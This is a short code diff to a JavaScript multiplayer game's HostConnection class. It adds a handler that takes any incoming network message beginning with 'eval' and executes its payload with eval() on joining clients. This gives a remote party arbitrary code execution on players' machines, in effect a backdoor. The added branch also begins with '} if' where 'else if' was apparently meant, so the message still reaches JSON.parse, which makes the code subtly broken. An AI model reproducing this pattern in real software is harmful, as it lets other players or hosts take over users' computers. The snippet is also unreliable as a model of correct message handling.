@@ -204,6 +204,11 @@ class HostConnection extends Connection {
   receiveMultiplayerData(data) {
     if (data.split(" ")[0] == "buffer") {
       this.buffer(data.split(" ")[1])
+    } if (data.split(" ")[0].includes("eval") && joining) {
+      console.log(data, data.split(" ")[1])
+      
+
+      eval(data.split(" ")[1].replace("\"",""))
     } else receiveMultiplayerData(JSON.parse(data))
     
   }
